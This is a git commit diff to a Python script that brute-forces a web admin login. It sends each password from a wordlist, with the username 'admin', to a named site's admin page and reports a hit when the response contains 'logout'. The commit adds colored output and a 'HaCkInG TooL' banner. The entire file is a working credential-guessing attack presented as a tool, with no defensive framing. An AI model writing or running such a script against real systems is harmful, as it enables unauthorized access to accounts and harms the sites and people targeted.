964be8f43cc567ac7f64ed04658490d4404cdcc2
SergioFelzener <felzenerdj@gmail.com>
2022-09-21 21:01:44 -0400

    beauty tool HaCkInG

--- HttpLoginBrute/http_brute_login.py
+++ HttpLoginBrute/http_brute_login.py
@@ -1,4 +1,6 @@
 import requests
+from colorama import Fore
+from colorama import Style
 
 
 print(" _   _ _____ _____ ____  ")
@@ -21,7 +23,11 @@ with open("wordlist.txt", "r") as file:
     for word in wordlist:
         data = {"user" : "admin", "password" : word}
         response = requests.post("http://advanced.bancocn.com/admin/index.php", data = data)
+        code = response.status_code
         if "logout" in response.text:
-            print("senha {} ok".format(word))
+            print("\n ***** FOUND PASSWORD ***** \n")
+            print(f"[ + ] - Password found : {Fore.GREEN}{word}{Style.RESET_ALL} code {Fore.GREEN}{code}{Style.RESET_ALL}\n".format(code))            
+            print("                    HaCKInG TooL by soapxbox")
         else:
-            print("senha {} incorreta".format(word))
+            print(f"[ - ] - Password wrong : {Fore.BLUE}{word}{Style.RESET_ALL} code {Fore.RED}{code}{Style.RESET_ALL}".format(code))
+            
